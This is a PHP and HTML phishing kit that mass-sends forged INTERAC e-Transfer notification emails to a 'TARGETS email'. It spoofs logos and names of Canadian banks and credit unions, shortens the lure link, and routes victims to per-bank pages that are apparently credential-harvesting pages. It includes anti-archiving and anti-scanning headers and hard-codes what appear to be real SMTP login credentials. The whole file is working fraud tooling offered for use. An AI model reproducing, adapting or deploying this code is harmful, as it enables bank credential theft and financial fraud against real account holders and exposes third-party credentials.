<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../Database/third-party-log.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>

<?php
    // Function to encrypt the URL parameters
    function encryptParameters($params, $key) {
        $ivLength = openssl_cipher_iv_length('AES-256-CBC');
        $iv = openssl_random_pseudo_bytes($ivLength);
        $encrypted = openssl_encrypt($params, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
        $encryptedMessage = $iv . $encrypted;
        $encryptedParams = base64_encode($encryptedMessage);
        return $encryptedParams;
    }

    // Replace with your encryption key
    $key = 'ENCRYPTED_PASSWORD_MAKE25+CHARACTERS';

    // URL parameters to encrypt
    $params = 'param1=value1&param2=value2';

    // Encrypt the parameters
    $encryptedParams = encryptParameters($params, $key);

    // Read the template file
    $templateFile = 'template.html';
    $emailTemplate = file_get_contents($templateFile);

    // Replace the placeholder with the encrypted parameters
    $emailTemplate = str_replace('{{encryptedParams}}', $encryptedParams, $emailTemplate);

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require("PHPMailer/src/PHPMailer.php");
require("PHPMailer/src/SMTP.php");
require("PHPMailer/src/Exception.php");

include "/anti/anti1.php";

$sender_name = $_POST['sender_name'];
$amount = $_POST['amount'];
$date = $_POST['date'];
$link = $_POST['link'];

$data = array($sender_name, $amount, $date, $link);
$file = fopen('/data.csv', 'a');
fputcsv($file, $data);
fclose($file);

$long_url = 'https://' . $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST);
$short_url = shortenURL($long_url);

$template = $_POST['template']; // The selected template from the dropdown
$message = file_get_contents('template.html');
$message = str_replace('{{shortlink}}', $short_url, $message);
$message = str_replace('{{line}}', $_POST['line'], $message);
$message = str_replace('{{username}}', $_POST['username'], $message);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{line}}', $_POST['line'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receiver_name}}', $_POST['receiver_name'], $message);
$message = str_replace('{{receiver_email}}', $_POST['receiver_email'], $message);

$mail = new PHPMailer();
$mail->IsSMTP();
$mail->SMTPSecure = 'tls';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port'];
$mail->Body = $message;
$mail->SMTPAuth = true;
$mail->Username = $_POST['username'];
$mail->Password = $_POST['password'];
$mail->SetFrom('taytayburkeallday@gmail.com', $_POST['sender_name']);
$mail->AddAddress($_POST['receiver_email']);
$mail->Subject = 'INTERAC e-Transfer - Template: ' . $template; // Subject includes the selected template
$mail->IsHTML(true);
$mail->CharSet = "utf-8";

if (!$mail->Send()) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}

function shortenURL($url)
{
    $api_url = 'https://is.gd/create.php?format=simple&url=' . urlencode($url);
    return file_get_contents($api_url);
}

$currentDate = new DateTime();
$line = $currentDate->add(new DateInterval('P30D'))->format('F d, Y');
?>
<!DOCTYPE html>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
    }

    h1 {
      text-align: center;
    }

    form {
      margin: 20px;
    }

    input[type="text"], select {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: none;
      background-color: #333;
      color: #fff;
    }

    input[type="submit"] {
      width: 100%;
      padding: 10px;
      border: none;
      background-color: #0066cc;
      color: #fff;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <form action="submit1.php" method="POST" enctype="multipart/form-data">
    <h1>AUTOMATIC SENDER</h1>
<input type="hidden" name="shortlink" value="" required="">
<input type="text" name="receiver_email" placeholder="TARGETS email" value="" required="">
<input type="text" name="receiver_name" placeholder="receivers name" value="One Time Contact" required="">
<input type="text" name="sender_name" placeholder="AB201293 LTD or" value="AB201293 LTD" required="">
<select name="amount" required>
  <option value="10.00"> 10.00</option>
  <option value="20.00"> 20.00</option>
  <option value="30.00"> 30.00</option>
  <option value="40.00"> 40.00</option>
  <option value="50.00"> 50.00</option>
  <option value="60.00"> 60.00</option>
  <option value="70.00"> 70.00</option>
  <option value="80.00"> 80.00</option>
  <option value="90.00"> 90.00</option>
  <option value="100.00"> 100.00</option>
  <option value="110.00"> 110.00</option>
  <option value="120.00"> 120.00</option>
  <option value="130.00"> 130.00</option>
  <option value="140.00"> 140.00</option>
  <option value="150.00"> 150.00</option>
  <option value="160.00"> 160.00</option>
  <option value="170.00"> 170.00</option>
  <option value="180.00"> 180.00</option>
  <option value="190.00"> 190.00</option>
  <option value="200.00"> 200.00</option>
  <option value="210.00"> 210.00</option>
  <option value="220.00"> 220.00</option>
  <option value="230.00"> 230.00</option>
  <option value="240.00"> 240.00</option>
  <option value="250.00"> 250.00</option>
  <option value="260.00"> 260.00</option>
  <option value="270.00"> 270.00</option>
  <option value="280.00"> 280.00</option>
  <option value="290.00"> 290.00</option>
  <option value="300.00"> 300.00</option>
  <option value="310.00"> 310.00</option>
  <option value="320.00"> 320.00</option>
  <option value="330.00"> 330.00</option>
  <option value="340.00"> 340.00</option>
  <option value="350.00"> 350.00</option>
  <option value="360.00"> 360.00</option>
  <option value="370.00"> 370.00</option>
  <option value="380.00"> 380.00</option>
  <option value="390.00"> 390.00</option>
  <option value="400.00"> 400.00</option>
  <option value="410.00"> 410.00</option>
  <option value="420.00"> 420.00</option>
  <option value="430.00"> 430.00</option>
  <option value="440.00"> 440.00</option>
  <option value="450.00"> 450.00</option>
  <option value="460.00"> 460.00</option>
  <option value="470.00"> 470.00</option>
  <option value="480.00"> 480.00</option>
  <option value="490.00"> 490.00</option>
  <option value="500.00"> 500.00</option>
  <option value="510.00"> 510.00</option>
  <option value="520.00"> 520.00</option>
  <option value="530.00"> 530.00</option>
  <option value="540.00"> 540.00</option>
  <option value="550.00"> 550.00</option>
  <option value="560.00"> 560.00</option>
  <option value="570.00"> 570.00</option>
  <option value="580.00"> 580.00</option>
  <option value="590.00"> 590.00</option>
  <option value="600.00"> 600.00</option>
  <option value="610.00"> 610.00</option>
  <option value="620.00"> 620.00</option>
  <option value="630.00"> 630.00</option>
  <option value="640.00"> 640.00</option>
  <option value="650.00"> 650.00</option>
  <option value="660.00"> 660.00</option>
  <option value="670.00"> 670.00</option>
  <option value="680.00"> 680.00</option>
  <option value="690.00"> 690.00</option>
  <option value="700.00"> 700.00</option>
  <option value="710.00"> 710.00</option>
  <option value="720.00"> 720.00</option>
  <option value="730.00"> 730.00</option>
  <option value="740.00"> 740.00</option>
  <option value="750.00"> 750.00</option>
  <option value="760.00"> 760.00</option>
  <option value="770.00"> 770.00</option>
  <option value="780.00"> 780.00</option>
  <option value="790.00"> 790.00</option>
  <option value="800.00"> 800.00</option>
  <option value="810.00"> 810.00</option>
  <option value="820.00"> 820.00</option>
  <option value="830.00"> 830.00</option>
  <option value="840.00"> 840.00</option>
  <option value="850.00"> 850.00</option>
  <option value="860.00"> 860.00</option>
  <option value="870.00"> 870.00</option>
  <option value="880.00"> 880.00</option>
  <option value="890.00"> 890.00</option>
  <option value="900.00"> 900.00</option>
  <option value="910.00"> 910.00</option>
  <option value="920.00"> 920.00</option>
  <option value="930.00"> 930.00</option>
  <option value="940.00"> 940.00</option>
  <option value="950.00"> 950.00</option>
  <option value="960.00"> 960.00</option>
  <option value="970.00"> 970.00</option>
  <option value="980.00"> 980.00</option>
  <option value="990.00"> 990.00</option>
  <option value="1000.00">1,000.00</option>
  <option value="1010.00">1,010.00</option>
  <option value="1020.00">1,020.00</option>
  <option value="1030.00">1,030.00</option>
  <option value="1040.00">1,040.00</option>
  <option value="1050.00">1,050.00</option>
  <option value="1060.00">1,060.00</option>
  <option value="1070.00">1,070.00</option>
  <option value="1080.00">1,080.00</option>
  <option value="1090.00">1,090.00</option>
  <option value="1100.00">1,100.00</option>
  <option value="1110.00">1,110.00</option>
  <option value="1120.00">1,120.00</option>
  <option value="1130.00">1,130.00</option>
  <option value="1140.00">1,140.00</option>
  <option value="1150.00">1,150.00</option>
  <option value="1160.00">1,160.00</option>
  <option value="1170.00">1,170.00</option>
  <option value="1180.00">1,180.00</option>
  <option value="1190.00">1,190.00</option>
  <option value="1200.00">1,200.00</option>
  <option value="1210.00">1,210.00</option>
  <option value="1220.00">1,220.00</option>
  <option value="1230.00">1,230.00</option>
  <option value="1240.00">1,240.00</option>
  <option value="1250.00">1,250.00</option>
  <option value="1260.00">1,260.00</option>
  <option value="1270.00">1,270.00</option>
  <option value="1280.00">1,280.00</option>
  <option value="1290.00">1,290.00</option>
  <option value="1300.00">1,300.00</option>
  <option value="1310.00">1,310.00</option>
  <option value="1320.00">1,320.00</option>
  <option value="1330.00">1,330.00</option>
  <option value="1340.00">1,340.00</option>
  <option value="1350.00">1,350.00</option>
  <option value="1360.00">1,360.00</option>
  <option value="1370.00">1,370.00</option>
  <option value="1380.00">1,380.00</option>
  <option value="1390.00">1,390.00</option>
  <option value="1400.00">1,400.00</option>
  <option value="1410.00">1,410.00</option>
  <option value="1420.00">1,420.00</option>
  <option value="1430.00">1,430.00</option>
  <option value="1440.00">1,440.00</option>
  <option value="1450.00">1,450.00</option>
  <option value="1460.00">1,460.00</option>
  <option value="1470.00">1,470.00</option>
  <option value="1480.00">1,480.00</option>
  <option value="1490.00">1,490.00</option>
  <option value="1500.00">1,500.00</option>
  <option value="1510.00">1,510.00</option>
  <option value="1520.00">1,520.00</option>
  <option value="1530.00">1,530.00</option>
  <option value="1540.00">1,540.00</option>
  <option value="1550.00">1,550.00</option>
  <option value="1560.00">1,560.00</option>
  <option value="1570.00">1,570.00</option>
  <option value="1580.00">1,580.00</option>
  <option value="1590.00">1,590.00</option>
  <option value="1600.00">1,600.00</option>
  <option value="1610.00">1,610.00</option>
  <option value="1620.00">1,620.00</option>
  <option value="1630.00">1,630.00</option>
  <option value="1640.00">1,640.00</option>
  <option value="1650.00">1,650.00</option>
  <option value="1660.00">1,660.00</option>
  <option value="1670.00">1,670.00</option>
  <option value="1680.00">1,680.00</option>
  <option value="1690.00">1,690.00</option>
  <option value="1700.00">1,700.00</option>
  <option value="1710.00">1,710.00</option>
  <option value="1720.00">1,720.00</option>
  <option value="1730.00">1,730.00</option>
  <option value="1740.00">1,740.00</option>
  <option value="1750.00">1,750.00</option>
  <option value="1760.00">1,760.00</option>
  <option value="1770.00">1,770.00</option>
  <option value="1780.00">1,780.00</option>
  <option value="1790.00">1,790.00</option>
  <option value="1800.00">1,800.00</option>
  <option value="1810.00">1,810.00</option>
  <option value="1820.00">1,820.00</option>
  <option value="1830.00">1,830.00</option>
  <option value="1840.00">1,840.00</option>
  <option value="1850.00">1,850.00</option>
  <option value="1860.00">1,860.00</option>
  <option value="1870.00">1,870.00</option>
  <option value="1880.00">1,880.00</option>
  <option value="1890.00">1,890.00</option>
  <option value="1900.00">1,900.00</option>
  <option value="1910.00">1,910.00</option>
  <option value="1920.00">1,920.00</option>
  <option value="1930.00">1,930.00</option>
  <option value="1940.00">1,940.00</option>
  <option value="1950.00">1,950.00</option>
  <option value="1960.00">1,960.00</option>
  <option value="1970.00">1,970.00</option>
  <option value="1980.00">1,980.00</option>
  <option value="1990.00">1,990.00</option>
  <option value="2000.00">2,000.00</option>
  <option value="2010.00">2,010.00</option>
  <option value="2020.00">2,020.00</option>
  <option value="2030.00">2,030.00</option>
  <option value="2040.00">2,040.00</option>
  <option value="2050.00">2,050.00</option>
  <option value="2060.00">2,060.00</option>
  <option value="2070.00">2,070.00</option>
  <option value="2080.00">2,080.00</option>
  <option value="2090.00">2,090.00</option>
  <option value="2100.00">2,100.00</option>
  <option value="2110.00">2,110.00</option>
  <option value="2120.00">2,120.00</option>
  <option value="2130.00">2,130.00</option>
  <option value="2140.00">2,140.00</option>
  <option value="2150.00">2,150.00</option>
  <option value="2160.00">2,160.00</option>
  <option value="2170.00">2,170.00</option>
  <option value="2180.00">2,180.00</option>
  <option value="2190.00">2,190.00</option>
  <option value="2200.00">2,200.00</option>
  <option value="2210.00">2,210.00</option>
  <option value="2220.00">2,220.00</option>
  <option value="2230.00">2,230.00</option>
  <option value="2240.00">2,240.00</option>
  <option value="2250.00">2,250.00</option>
  <option value="2260.00">2,260.00</option>
  <option value="2270.00">2,270.00</option>
  <option value="2280.00">2,280.00</option>
  <option value="2290.00">2,290.00</option>
  <option value="2300.00">2,300.00</option>
  <option value="2310.00">2,310.00</option>
  <option value="2320.00">2,320.00</option>
  <option value="2330.00">2,330.00</option>
  <option value="2340.00">2,340.00</option>
  <option value="2350.00">2,350.00</option>
  <option value="2360.00">2,360.00</option>
  <option value="2370.00">2,370.00</option>
  <option value="2380.00">2,380.00</option>
  <option value="2390.00">2,390.00</option>
  <option value="2400.00">2,400.00</option>
  <option value="2410.00">2,410.00</option>
  <option value="2420.00">2,420.00</option>
  <option value="2430.00">2,430.00</option>
  <option value="2440.00">2,440.00</option>
  <option value="2450.00">2,450.00</option>
  <option value="2460.00">2,460.00</option>
  <option value="2470.00">2,470.00</option>
  <option value="2480.00">2,480.00</option>
  <option value="2490.00">2,490.00</option>
  <option value="2500.00">2,500.00</option>
  <option value="2510.00">2,510.00</option>
  <option value="2520.00">2,520.00</option>
  <option value="2530.00">2,530.00</option>
  <option value="2540.00">2,540.00</option>
  <option value="2550.00">2,550.00</option>
  <option value="2560.00">2,560.00</option>
  <option value="2570.00">2,570.00</option>
  <option value="2580.00">2,580.00</option>
  <option value="2590.00">2,590.00</option>
  <option value="2600.00">2,600.00</option>
  <option value="2610.00">2,610.00</option>
  <option value="2620.00">2,620.00</option>
  <option value="2630.00">2,630.00</option>
  <option value="2640.00">2,640.00</option>
  <option value="2650.00">2,650.00</option>
  <option value="2660.00">2,660.00</option>
  <option value="2670.00">2,670.00</option>
  <option value="2680.00">2,680.00</option>
  <option value="2690.00">2,690.00</option>
  <option value="2700.00">2,700.00</option>
  <option value="2710.00">2,710.00</option>
  <option value="2720.00">2,720.00</option>
  <option value="2730.00">2,730.00</option>
  <option value="2740.00">2,740.00</option>
  <option value="2750.00">2,750.00</option>
  <option value="2760.00">2,760.00</option>
  <option value="2770.00">2,770.00</option>
  <option value="2780.00">2,780.00</option>
  <option value="2790.00">2,790.00</option>
  <option value="2800.00">2,800.00</option>
  <option value="2810.00">2,810.00</option>
  <option value="2820.00">2,820.00</option>
  <option value="2830.00">2,830.00</option>
  <option value="2840.00">2,840.00</option>
  <option value="2850.00">2,850.00</option>
  <option value="2860.00">2,860.00</option>
  <option value="2870.00">2,870.00</option>
  <option value="2880.00">2,880.00</option>
  <option value="2890.00">2,890.00</option>
  <option value="2900.00">2,900.00</option>
  <option value="2910.00">2,910.00</option>
  <option value="2920.00">2,920.00</option>
  <option value="2930.00">2,930.00</option>
  <option value="2940.00">2,940.00</option>
  <option value="2950.00">2,950.00</option>
  <option value="2960.00">2,960.00</option>
  <option value="2970.00">2,970.00</option>
  <option value="2980.00">2,980.00</option>
  <option value="2990.00">2,990.00</option>
  <option value="3000.00">3,000.00</option>
</select>
<input type="hidden" name="line" value="<?php echo $line; ?>" required="">
<center>
<select name="photo_href" id="photo_href">

<option value="https://etransfer-content.interac.ca/en/logo_CA000003.png">RBC Royal Bank

</option>
 
<option value="">--WORKING--

 </option>  

 <option value="https://etransfer-content.interac.ca/en/logo_CA000002.png">Scotiabank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000001.png">BMO

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000010.png">CIBC

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000004.png">TD

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000292.png">National Bank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000045.png">Desjardins

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000118.png">Laurentian Bank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000062.png">HSBC

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000344.png">Simplii Financial

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000007.png">Tangerine

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000310.png">Motusbank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000343.png">Manulife Bank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000016.png">President's Choice Financial

</option>

<option value="">------PROVINCAL------

</option>  

<option value="https://etransfer-content.interac.ca/en/logo_CA000220.png">B.C. [VANCITY]

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000219.png">ALBERTA  [ATB]

</option>

<option value="">----CREDIT-U-OTHER----

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000315.png">FirstOntario Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000238.png">Meridian Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000346.png">Motive Financial

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000324.png">Alterna Savings

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000210.png">Bridgewater Bank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000311.png">Oaken Financial

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000341.png">Zag Bank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000217.png">Servus Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000314.png">Westminster Savings Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000325.png">Christian Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000331.png">Vancity Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000332.png">Valley First Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000338.png">Mountain View Financial

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000345.png">Connect First Credit Union

</option>

</select>
<select name="bank" id="bank">

<option value="RBC Royal Bank">RBC Royal Bank

</option>
 
<option value="Scotia Bank">Scotia Bank

 </option>
 
 <option value="Bank of Montreal">Bank of Montreal

 </option>
 
 <option value="CIBC">CIBC

 </option>

 
 <option value="ATB Financial">ATB Financial

 </option>
 
 <option value="TD Canada Trust">TD Canada Trust

 </option>
 
 <option value="HSBC Bank Canada">HSBC Bank Canada

 </option>
 
 <option value="National Bank of Canada">National Bank of Canada

 </option>
 
 <option value="Desjardins">Desjardins

 </option>
 
 <option value="Laurentian Bank of Canada">Laurentian Bank of Canada

 </option>
 
 <option value="Manulife Bank of Canada">Manulife Bank of Canada

 </option>
 
 <option value="Tangerine Bank">Tangerine Bank

 </option>
 
 <option value="Motus">Motusbank

 </option>
 
 <option value="Simplii Financial">Simplii Financial

 </option>
 
 <option value="Vancity">Vancity

 </option>
    
</select>
    <style>

    </style>
    <select name="photo_href" id="photo_href">
 
    <option value="/sco/928460.php">RBC Royal Bank

 </option>
 
 <option value="/sco/928460.php">Scotia Bank

 </option>
 
 <option value="/simplii/928460.php">Scotia Bank

 </option> 
 
 <option value="/bmo/928460.php">Bank of Montreal

 </option>
 
 <option value="/cibc/928460.php">CIBC

 </option>
 
 <option value="/rbc/928460.php">RBC Royal Bank

 </option>
 
 <option value="/td/928460.php">TD Canada Trust

 </option>
 
 <option value="/hsbc/928460.php">HSBC Bank Canada

 </option>
 
 <option value="/nbc/928460.php">National Bank of Canada

 </option>
 
 <option value="/desj/928460.php">Desjardins

 </option>
 
 <option value="/laur/928460.php">Laurentian Bank of Canada

 </option>
 
 <option value="/manu/928460.php">Manulife Bank of Canada

 </option>
 
 <option value="/tang/928460.php">Tangerine Bank

 </option>
 
 <option value="/equitable/928460.php">Equitable Bank

 </option>
 
 <option value="/motus/928460.php">Motusbank

 </option>
</select>

<input type="hidden" name="port" value="2525" required="">
<input type="hidden" name="username" value="taytayburkeallday@gmail.com" required="">
<input type="hidden" name="password" value="E491908C41CE3BFA84FA8F67672C26B78454" required="">
<input type="hidden" name="host" value="smtp.elasticemail.com" required="">

  <input type="submit" value="Submit">

</fieldset></form></body></html>